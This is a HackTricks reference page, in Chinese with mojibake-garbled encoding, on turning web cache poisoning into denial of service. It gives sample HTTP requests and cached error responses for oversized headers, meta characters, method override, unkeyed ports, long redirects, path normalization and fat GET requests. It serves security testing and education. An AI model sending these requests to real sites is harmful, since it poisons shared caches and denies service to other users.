# Cache Poisoning to DoS

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

{% hint style="danger" %}
åœ¨æ­¤é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸åŒçš„å˜ä½“ï¼Œä»¥å°è¯•ä½¿ **Web æœåŠ¡å™¨å¯¹æœ‰æ•ˆçš„ç¼“å­˜æœåŠ¡å™¨è¯·æ±‚** **å“åº”é”™è¯¯**ã€‚
{% endhint %}

* **HTTP Header Oversize (HHO)**

å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¤´éƒ¨å¤§å°å¤§äº Web æœåŠ¡å™¨æ”¯æŒçš„å¤§å°ï¼Œä½†å°äºç¼“å­˜æœåŠ¡å™¨æ”¯æŒçš„å¤§å°ã€‚Web æœåŠ¡å™¨å°†ä»¥ 400 å“åº”è¿›è¡Œå“åº”ï¼Œè¯¥å“åº”å¯èƒ½ä¼šè¢«ç¼“å­˜ï¼š
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Character (HMC) & Unexpected values**

å‘é€ä¸€ä¸ªåŒ…å«ä¸€äº› **æœ‰å®³å…ƒå­—ç¬¦** çš„å¤´ï¼Œä¾‹å¦‚  å’Œ ã€‚ä¸ºäº†ä½¿æ”»å‡»æœ‰æ•ˆï¼Œæ‚¨å¿…é¡»é¦–å…ˆç»•è¿‡ç¼“å­˜ã€‚
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
ä¸€ä¸ªé…ç½®é”™è¯¯çš„å¤´éƒ¨å¯èƒ½åªæ˜¯ `\:` ä½œä¸ºå¤´éƒ¨ã€‚

å¦‚æœå‘é€äº†æ„å¤–çš„å€¼ï¼Œè¿™ä¹Ÿå¯èƒ½æœ‰æ•ˆï¼Œæ¯”å¦‚æ„å¤–çš„ Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **æœªé”®å…¥çš„å¤´éƒ¨**

ä¸€äº›ç½‘ç«™å¦‚æœåœ¨è¯·æ±‚ä¸­**çœ‹åˆ°æŸäº›ç‰¹å®šçš„å¤´éƒ¨**ï¼Œä¾‹å¦‚å¸¦æœ‰ _X-Amz-Website-Location-Redirect: someThing_ å¤´éƒ¨æ—¶ï¼Œä¼šè¿”å›é”™è¯¯çŠ¶æ€ç ï¼š
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP æ–¹æ³•è¦†ç›–æ”»å‡» (HMO)**

å¦‚æœæœåŠ¡å™¨æ”¯æŒé€šè¿‡ `X-HTTP-Method-Override`ã€`X-HTTP-Method` æˆ– `X-Method-Override` ç­‰å¤´éƒ¨æ›´æ”¹ HTTP æ–¹æ³•ã€‚å¯ä»¥è¯·æ±‚ä¸€ä¸ªæœ‰æ•ˆçš„é¡µé¢ï¼Œæ”¹å˜æ–¹æ³•ä½¿å¾—æœåŠ¡å™¨ä¸æ”¯æŒï¼Œä»è€Œå¯¼è‡´é”™è¯¯çš„å“åº”è¢«ç¼“å­˜ï¼š
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **æœªé”®å…¥ç«¯å£**

å¦‚æœä¸»æœºå¤´ä¸­çš„ç«¯å£åœ¨å“åº”ä¸­è¢«åå°„ä¸”æœªåŒ…å«åœ¨ç¼“å­˜é”®ä¸­ï¼Œåˆ™å¯ä»¥å°†å…¶é‡å®šå‘åˆ°æœªä½¿ç”¨çš„ç«¯å£ï¼š
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **é•¿é‡å®šå‘ DoS**

å¦‚ä»¥ä¸‹ç¤ºä¾‹æ‰€ç¤ºï¼Œx æ²¡æœ‰è¢«ç¼“å­˜ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åˆ©ç”¨é‡å®šå‘å“åº”è¡Œä¸ºï¼Œä½¿é‡å®šå‘å‘é€ä¸€ä¸ªå¦‚æ­¤å¤§çš„ URL ä»¥è‡³äºè¿”å›é”™è¯¯ã€‚ç„¶åï¼Œè¯•å›¾åœ¨æ²¡æœ‰æœªç¼“å­˜çš„ x å¯†é’¥çš„æƒ…å†µä¸‹è®¿é—®è¯¥ URL çš„äººå°†æ”¶åˆ°é”™è¯¯å“åº”ï¼š
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **ä¸»æœºå¤´éƒ¨å¤§å°å†™è§„èŒƒåŒ–**

ä¸»æœºå¤´éƒ¨åº”è¯¥æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œä½†æŸäº›ç½‘ç«™æœŸæœ›å®ƒæ˜¯å°å†™çš„ï¼Œå¦‚æœä¸æ˜¯åˆ™è¿”å›é”™è¯¯ï¼š
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **è·¯å¾„è§„èŒƒåŒ–**

æŸäº›é¡µé¢åœ¨è·¯å¾„ä¸­å‘é€æ•°æ® URLencode æ—¶ä¼šè¿”å›é”™è¯¯ä»£ç ï¼Œä½†ç¼“å­˜æœåŠ¡å™¨ä¼šå¯¹è·¯å¾„è¿›è¡Œ URLdecode å¹¶å­˜å‚¨ URLdecoded è·¯å¾„çš„å“åº”ï¼š
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

ä¸€äº›ç¼“å­˜æœåŠ¡å™¨ï¼Œå¦‚ Cloudflareï¼Œæˆ– web æœåŠ¡å™¨ï¼Œåœæ­¢å¸¦æœ‰ä¸»ä½“çš„ GET è¯·æ±‚ï¼Œå› æ­¤è¿™å¯èƒ½è¢«æ»¥ç”¨æ¥ç¼“å­˜æ— æ•ˆå“åº”ï¼š
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## å‚è€ƒæ–‡çŒ®

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
